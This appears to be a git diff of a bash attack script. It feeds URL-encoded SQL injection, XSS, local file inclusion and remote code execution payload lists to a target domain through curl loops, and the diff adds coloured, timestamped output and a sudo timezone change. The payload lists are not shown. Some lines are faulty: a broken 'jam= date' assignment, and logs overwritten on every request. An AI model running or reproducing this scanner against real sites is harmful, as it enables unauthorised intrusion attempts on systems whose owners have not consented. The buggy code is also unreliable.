@@ -1,11 +1,18 @@
 #!/bin/bash
+sudo timedatectl set-timezone Asia/Bangkok
+
+merah='\033[0;31m'
+hijau='\033[0;32m'
+blank='\033[0m'
+jam= date +"%T"
 
 encode1=$(cat sqlilist.txt | sed 's/ /%20/g' > sqlilist_encode.txt)
 sqli(){
 for cek in $(cat sqlilist_encode.txt);
 do
 curl -s $domain$cek > logs/sqlilog.txt
-echo "SQLI -> $domain"
+printf "${merah}SQLI ${blank} -> $domain  $hijau"
+date +"%T"
 done
 }
 
@@ -15,7 +22,8 @@ xss(){
 for cek in $(cat xsslist_encode.txt);
 do
 curl -s $domain$cek > logs/xsslog.txt
-echo "XSS -> $domain"
+printf "${merah}XSS ${blank} -> $domain  $hijau"
+date +"%T"
 done
 }
 
@@ -24,7 +32,8 @@ lfi(){
 for cek in $(cat lfilist_encode.txt);
 do
 curl -s $domain$cek > logs/lfilog.txt
-echo "LFI -> $domain"
+printf "${merah}LFI ${blank} -> $domain  $hijau"
+date +"%T"
 done
 }
 
@@ -33,7 +42,8 @@ rce(){
 for cek in $(cat rcelist_encode.txt);
 do
 curl -s $domain$cek > logs/rcelog.txt
-echo "RCE -> $domain"
+printf "${merah}RCE ${blank} -> $domain  $hijau"
+date +"%T"
 done
 }
 
